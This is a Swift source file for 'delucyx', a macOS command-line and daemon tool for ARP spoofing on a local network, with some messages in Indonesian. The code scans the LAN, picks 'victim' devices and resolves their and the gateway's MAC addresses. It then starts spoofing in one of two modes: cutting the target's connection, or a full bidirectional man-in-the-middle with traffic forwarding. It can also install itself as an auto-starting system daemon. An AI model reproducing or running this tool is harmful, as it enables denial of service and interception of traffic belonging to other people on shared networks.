import Foundation

func usage() {
    print("""
    delucyx - LAN Access Control Tool

    Usage:
      delucyx                             Interactive TUI (OpenTUI)
      delucyx menu                        Legacy text menu
      sudo delucyx <victim-ip> [options]  CLI mode
      sudo delucyx install                Install as system daemon (auto-start)
      sudo delucyx uninstall              Remove system daemon
      sudo delucyx upgrade                Rebuild and hot-reload running daemon
      sudo delucyx stop all               Stop spoofing (daemon held)
      sudo delucyx hold                   Pause daemon auto-spoof
      sudo delucyx resume                 Resume auto mode
      sudo delucyx status                 Show daemon status

    Options:
      -i, --interface <name>  Network interface (default: auto)
      -g, --gateway <ip>      Gateway IP (default: auto)
      -r, --repeat <secs>     Spoof interval in seconds (default: 2)
      -b, --bidirectional     Spoof both victim and gateway (full MITM)
      -f, --forward           Enable IP forwarding
      -v, --verbose           Verbose output
      --help                  Show this help

    Examples:
      sudo delucyx
      sudo delucyx 192.168.1.100 -b -f
      sudo delucyx install
      sudo delucyx stop all
    """)
}

func main() {
    let args = CommandLine.arguments
    if args.contains("--help") {
        usage()
        return
    }

    // Daemon subcommands
    if args.count >= 2 {
        switch args[1] {
        case "install":
            installDaemon()
            return
        case "uninstall":
            uninstallDaemon()
            return
        case "status":
            daemonStatus()
            return
        case "stop":
            if args.count >= 3 && args[2] == "all" {
                stopAll()
            } else {
                print("Usage: delucyx stop all")
            }
            return
        case "hold":
            holdDaemon()
            return
        case "resume":
            resumeDaemon()
            return
        case "tui":
            launchTUI(fallbackToMenu: false)
            return
        case "menu":
            interactiveMode()
            return
        case "upgrade":
            upgradeDaemon()
            return
        case "--daemon":
            runDaemon()
            return
        default:
            break
        }
    }

    let positionalArgs = args.dropFirst().filter { !$0.hasPrefix("-") }
    if positionalArgs.isEmpty {
        launchTUI(fallbackToMenu: true)
        return
    }

    cliMode()
}

// MARK: - TUI launcher

func findBun() -> String? {
    let env = ProcessInfo.processInfo.environment
    if let explicit = env["DELUCYX_BUN"], FileManager.default.isExecutableFile(atPath: explicit) {
        return explicit
    }

    var candidates: [String] = []
    if let path = env["PATH"] {
        candidates += path.split(separator: ":").map { "\($0)/bun" }
    }
    candidates += [
        "\(NSHomeDirectory())/.bun/bin/bun",
        "/opt/homebrew/bin/bun",
        "/usr/local/bin/bun",
        "/usr/bin/bun"
    ]

    return candidates.first { FileManager.default.isExecutableFile(atPath: $0) }
}

func resolveTUIDir() -> String? {
    var candidates: [String] = []
    if let explicit = ProcessInfo.processInfo.environment["DELUCYX_TUI_DIR"] {
        candidates.append(explicit)
    }
    let binaryDir = URL(fileURLWithPath: currentExecutablePath())
        .deletingLastPathComponent().path
    candidates += [
        "\(binaryDir)/../tui",        // repo layout: build/delucyx → tui/
        "\(binaryDir)/tui",
        "\(NSHomeDirectory())/.delucyx/tui"
    ]

    for dir in candidates {
        let entry = (dir as NSString).appendingPathComponent("index.ts")
        if FileManager.default.fileExists(atPath: entry) {
            return URL(fileURLWithPath: dir).standardizedFileURL.path
        }
    }
    return nil
}

func launchTUI(fallbackToMenu: Bool) {
    guard let tuiDir = resolveTUIDir(), let bun = findBun() else {
        warn("TUI butuh Bun dan folder tui/ — belum tersedia")
        status("Install: make tui-deps && make install-tui")
        if fallbackToMenu {
            warn("Pakai menu legacy dulu")
            interactiveMode()
        } else {
            fail("Jalankan: make tui-deps && make install-tui")
        }
        return
    }

    let binaryPath = currentExecutablePath()
    let entry = (tuiDir as NSString).appendingPathComponent("index.ts")

    // Hand the terminal over to Bun with execv: an idle parent process would keep
    // the foreground process group and break the TUI's terminal ownership.
    setenv("DELUCYX_BIN", binaryPath, 1)
    setenv("DELUCYX_TUI_DIR", tuiDir, 1)
    if chdir(tuiDir) != 0 {
        fail("Tidak bisa masuk ke \(tuiDir)")
        return
    }

    var argv: [UnsafeMutablePointer<CChar>?] = [
        strdup(bun),
        strdup("run"),
        strdup(entry),
        nil
    ]
    defer { for arg in argv where arg != nil { free(arg) } }

    _ = argv.withUnsafeMutableBufferPointer { buffer in
        execv(bun, buffer.baseAddress)
    }

    fail("Tidak bisa menjalankan TUI di \(bun): \(String(cString: strerror(errno)))")
}

func interactiveMode() {
    showBanner()

    guard let ifname = selectInterface() else { return }
    ok("Interface \(ifname)")

    guard let ourIP = getInterfaceIP(ifname) else {
        fail("Tidak dapat mendeteksi IP interface \(ifname)")
        return
    }
    ok("IP \(ourIP)")

    guard let ourMAC = getInterfaceMAC(ifname) else {
        fail("Tidak dapat mendeteksi MAC address")
        return
    }
    ok("MAC \(macToString(ourMAC))")

    guard let gw = getGatewayIP() else {
        fail("Tidak dapat mendeteksi gateway")
        return
    }
    ok("Gateway \(gw)")

    let bpf: DelucyxBPF
    do {
        bpf = try DelucyxBPF(interface: ifname)
    } catch {
        fail("Buka BPF gagal: \(error.localizedDescription)")
        warn("Jalankan dengan sudo")
        return
    }
    defer { bpf.close() }

    ok("BPF siap")

    status("Mencari gateway MAC...")
    guard let gatewayMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
        fail("Tidak dapat resolve MAC gateway")
        return
    }
    ok("Gateway \(gw) = \(macToString(gatewayMAC))")

    status("Memindai jaringan...")
    let knownDevices = quickScanARPTable(gatewayIP: gw, ourIP: ourIP)
    if !knownDevices.isEmpty {
        ok("Ditemukan \(knownDevices.count) device dari ARP cache")
    }

    status("Scan aktif (deep)...")
    guard let scanResult = try? scanNetwork(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, gatewayIP: gw, ifname: ifname, deep: true) else {
        fail("Scan jaringan gagal")
        return
    }

    var allDevices = knownDevices
    for d in scanResult.devices {
        if !allDevices.contains(where: { $0.ip == d.ip }) {
            allDevices.append(d)
        }
    }

    let ourDevice = DeviceInfo(
        ip: ourIP, mac: macToString(ourMAC),
        hostname: resolveHostname(ourIP),
        isGateway: false, isSelf: true
    )

    if !allDevices.contains(where: { $0.ip == ourIP }) {
        allDevices.insert(ourDevice, at: 0)
    }

    let gatewayDevice = DeviceInfo(
        ip: gw, mac: macToString(gatewayMAC),
        hostname: resolveHostname(gw),
        isGateway: true, isSelf: false
    )

    if let existingGW = allDevices.firstIndex(where: { $0.isGateway }) {
        allDevices[existingGW] = gatewayDevice
    } else {
        allDevices.insert(gatewayDevice, at: 0)
    }

    let tableDevices = allDevices.filter { !$0.ip.hasSuffix(".255") && !$0.ip.hasSuffix(".0") }
    guard let selectedIndices = showDeviceTableMulti(tableDevices) else { return }

    let targets = selectedIndices.map { tableDevices[$0] }

    for target in targets {
        if target.isGateway {
            warn("Target \(target.ip) adalah gateway — dilewati.")
        }
    }

    let validTargets = targets.filter { !$0.isGateway }
    if validTargets.isEmpty {
        warn("Tidak ada target valid.")
        return
    }

    print("")
    print(c(.dim, "  Mode:"))
    print(c(.dim, "  [1] Potong koneksi (standar + AP poison)"))
    print(c(.dim, "  [2] MITM penuh (bidirectional)"))
    print(c(.dim, "  Pilih [1/2]"), terminator: " ")
    let modeChoice = readLine() ?? ""
    let bidirectional = modeChoice == "2"
    let forwardTraffic = bidirectional

    var configs: [SpooferConfig] = []
    for target in validTargets {
        let targetMAC: MACAddr
        if let parsed = stringToMAC(target.mac), !isAllZeroMAC(parsed) {
            targetMAC = parsed
            ok("MAC \(target.ip) = \(macToString(targetMAC)) (dari scan)")
        } else {
            status("Resolve MAC \(target.ip)...")
            guard let resolved = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: target.ip) else {
                fail("Tidak dapat resolve MAC \(target.ip) — dilewati")
                continue
            }
            targetMAC = resolved
            ok("\(target.ip) = \(macToString(targetMAC))")
        }

        configs.append(SpooferConfig(
            interface: ifname,
            victimIP: target.ip,
            gatewayIP: gw,
            ourMAC: ourMAC,
            ourIP: ourIP,
            victimMAC: targetMAC,
            gatewayMAC: gatewayMAC,
            interval: 0.3,
            bidirectional: bidirectional,
            forwardTraffic: forwardTraffic
        ))
    }

    if configs.isEmpty {
        warn("Tidak ada target yang dapat di-spoof.")
        return
    }

    guard confirmActionMulti(configs: configs) else {
        warn("Dibatalkan")
        return
    }

    do {
        try startMassSpoofing(configs: configs)
    } catch {
        fail("\(error.localizedDescription)")
    }
}

func cliMode() {
    let args = CommandLine.arguments
    var victimIP: String?
    var interface: String?
    var gatewayIP: String?
    var interval: TimeInterval = 2
    var bidirectional = false
    var forwardTraffic = false
    var verbose = false

    var i = 1
    while i < args.count {
        let arg = args[i]
        switch arg {
        case "-i", "--interface":
            i += 1
            guard i < args.count else { print("Missing interface name"); return }
            interface = args[i]
        case "-g", "--gateway":
            i += 1
            guard i < args.count else { print("Missing gateway IP"); return }
            gatewayIP = args[i]
        case "-r", "--repeat":
            i += 1
            guard i < args.count, let val = Double(args[i]) else {
                print("Invalid repeat interval"); return
            }
            interval = val
        case "-b", "--bidirectional":
            bidirectional = true
        case "-f", "--forward":
            forwardTraffic = true
        case "-v", "--verbose":
            verbose = true
        default:
            if !arg.hasPrefix("-") {
                victimIP = arg
            } else {
                print("Unknown option: \(arg)")
                usage()
                return
            }
        }
        i += 1
    }

    guard let victim = victimIP else {
        print("Error: victim IP required")
        usage()
        return
    }

    let ifname: String
    if let provided = interface {
        ifname = provided
    } else if let detected = getDefaultInterface() {
        ifname = detected
        if verbose { print("Interface: \(ifname)") }
    } else {
        print("Error: could not detect interface. Specify with -i")
        return
    }

    let gw: String
    if let provided = gatewayIP {
        gw = provided
    } else if let detected = getGatewayIP() {
        gw = detected
        if verbose { print("Gateway: \(gw)") }
    } else {
        print("Error: could not detect gateway. Specify with -g")
        return
    }

    guard let ourIP = getInterfaceIP(ifname) else {
        print("Error: could not get IP for interface \(ifname)")
        return
    }

    guard let ourMAC = getInterfaceMAC(ifname) else {
        print("Error: could not get MAC for interface \(ifname)")
        return
    }

    if verbose {
        print("Our IP: \(ourIP)")
        print("Our MAC: \(macToString(ourMAC))")
        print("Victim: \(victim)")
    }

    let bpf: DelucyxBPF
    do {
        bpf = try DelucyxBPF(interface: ifname)
    } catch {
        print("Error opening BPF: \(error.localizedDescription)")
        print("Try running with sudo")
        return
    }
    defer { bpf.close() }

    print("Resolving victim MAC...")
    let victimMAC: MACAddr
    if let cached = getMACFromARPTable(victim) {
        victimMAC = cached
        print("  \(victim) is-at \(macToString(victimMAC)) (ARP cache)")
    } else {
        do {
            victimMAC = try resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: victim)
        } catch {
            print("Error: \(error.localizedDescription)")
            return
        }
        print("  \(victim) is-at \(macToString(victimMAC))")
    }

    print("Resolving gateway MAC...")
    let gatewayMAC: MACAddr
    if let cached = getMACFromARPTable(gw) {
        gatewayMAC = cached
        print("  \(gw) is-at \(macToString(gatewayMAC)) (ARP cache)")
    } else {
        do {
            gatewayMAC = try resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw)
        } catch {
            print("Error: \(error.localizedDescription)")
            return
        }
        print("  \(gw) is-at \(macToString(gatewayMAC))")
    }

    let config = SpooferConfig(
        interface: ifname,
        victimIP: victim,
        gatewayIP: gw,
        ourMAC: ourMAC,
        ourIP: ourIP,
        victimMAC: victimMAC,
        gatewayMAC: gatewayMAC,
        interval: interval,
        bidirectional: bidirectional,
        forwardTraffic: forwardTraffic
    )

    do {
        try startSpoofing(config: config)
    } catch {
        print("Spoof error: \(error.localizedDescription)")
    }
}

func getDefaultInterface() -> String? {
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/sbin/route")
    task.arguments = ["-n", "get", "default"]
    let out = Pipe()
    task.standardOutput = out
    guard (try? task.run()) != nil else { return nil }
    task.waitUntilExit()
    let data = out.fileHandleForReading.readDataToEndOfFile()
    guard let output = String(data: data, encoding: .utf8) else { return nil }
    for line in output.components(separatedBy: "\n") {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        if trimmed.hasPrefix("interface:") {
            return trimmed.components(separatedBy: " ").last?.trimmingCharacters(in: .whitespaces)
        }
    }
    return nil
}

func getInterfaceMAC(_ ifname: String) -> MACAddr? {
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/sbin/ifconfig")
    task.arguments = [ifname]
    let out = Pipe()
    task.standardOutput = out
    guard (try? task.run()) != nil else { return nil }
    task.waitUntilExit()
    let data = out.fileHandleForReading.readDataToEndOfFile()
    guard let output = String(data: data, encoding: .utf8) else { return nil }
    for line in output.components(separatedBy: "\n") {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        if trimmed.hasPrefix("ether ") {
            let macStr = trimmed.replacingOccurrences(of: "ether ", with: "").trimmingCharacters(in: .whitespaces)
            return stringToMAC(macStr)
        }
    }
    return nil
}

main()
